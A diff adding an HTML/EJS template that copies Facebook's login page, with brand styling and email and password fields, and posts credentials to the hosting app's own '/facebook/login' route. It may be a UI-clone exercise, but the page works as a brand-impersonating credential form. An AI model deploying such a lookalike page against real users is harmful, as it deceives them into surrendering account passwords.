@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+</head>
+
+<!-- STYLE SHEET -->
+<style>
+    * {
+        padding: 0%;
+        margin: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background-color: azure;
+    }
+
+    .intro {
+        margin-left: 20%;
+        margin-top: 12%;
+    }
+
+    h1 {
+        color: blue;
+        font-size: 70px;
+
+    }
+
+    h2{
+        color: red;
+        font-size: 21px;
+        margin-left: 20px;
+        margin-top: 7px;
+    }
+
+    .texts {
+        font-size: 28px;
+    }
+
+    .log {
+        height: 376px;
+        width: 370px;
+        border: 2px solid white;
+        border-radius: 9px;
+        margin-left: 45%;
+        margin-top: -16%;
+        box-shadow: 1px 1px 15px rgb(160, 155, 155);
+        background-color: white;
+
+    }
+
+    .text1 {
+        height: 52px;
+        width: 320px;
+        margin-top: 20px;
+        margin-left: 20px;
+        padding-left: 10px;
+        font-size: 15px;
+    }
+
+    .text2 {
+        height: 52px;
+        width: 320px;
+        margin-top: 20px;
+        margin-left: 20px;
+        padding-left: 10px;
+        font-size: 15px;
+    }
+
+    .text1.active {
+        border: 3px solid blue;
+    }
+
+    .text2.active {
+        border: 3px solid blue;
+    }
+
+    .btn {
+        height: 49px;
+        width: 320px;
+        background-color: blue;
+        margin-left: 20px;
+        color: white;
+        margin-top: 14px;
+        font-size: 19px;
+        border-radius: 5px;
+        border: 2px solid blue;
+        cursor: pointer;
+    }
+
+    .btn2 {
+        height: 49px;
+        width: 310px;
+        background-color: white;
+        margin-left: 24px;
+        color: blue;
+        margin-top: 4px;
+        font-size: 15px;
+        border-radius: 5px;
+        border: 2px solid white;
+        cursor: pointer;
+
+    }
+
+    .btn3 {
+        height: 49px;
+        width: 210px;
+        background-color: rgb(131, 221, 4);
+        margin-left: 80px;
+        color: white;
+        margin-top: 11px;
+        font-size: 18px;
+        border-radius: 5px;
+        border: 2px solid rgb(131, 221, 4);
+        cursor: pointer;
+
+    }
+
+    .fin {
+        margin-left: 48%;
+        margin-top: 29px;
+    }
+
+    .btn4 {
+        background-color: azure;
+        border: 2px solid azure;
+        font-weight: bold;
+        cursor: pointer;
+    }
+</style>
+
+<!-- ******************************************** -->
+
+
+<body>
+    <div class="intro">
+        <h1>facebook</h1>
+
+        <header class="texts">Facebook helps you connect and share <br>
+            with the people in your life.
+        </header>
+       
+        <form action="/facebook/login" method="post">
+            
+            <div class="log">
+                <h2>  <% if (messages.error) { %> 
+                    <%= messages.error %> 
+                    <% } %> 
+                </h2>
+                <input type="email" class="text1" id="email" placeholder="Email address or phone number" name="email" required>
+                <input type="password" class="text2" id="pass" placeholder="Password" name="password" required>
+                <button class="btn" type="submit">Log in</button>
+                <button class="btn2">Forgotten password?</button>
+                <button class="btn3">Create new account</button>
+            </div>
+        </form>
+
+
+        <div class="fin"><button class="btn4">Create a page</button>
+            for a celebrity, brand or business.
+        </div>
+    </div>
+
+
+
+    <!-- ********************************** -->
+
+    <script>
+
+
+        const text1 = document.querySelector(".text1")
+        const text2 = document.querySelector(".text2")
+        const button = document.querySelector('.btn')
+        const email = text1.value.length
+        const password = text2.value.length
+
+        text1.addEventListener("click", () => {
+            text1.classList.toggle('active')
+            text2.classList.remove('active')
+        })
+
+        text2.addEventListener("click", () => {
+            text2.classList.toggle('active')
+            text1.classList.remove('active')
+
+        })
+
+
+
+
+
+    </script>
+
+</body>
+
+</html>
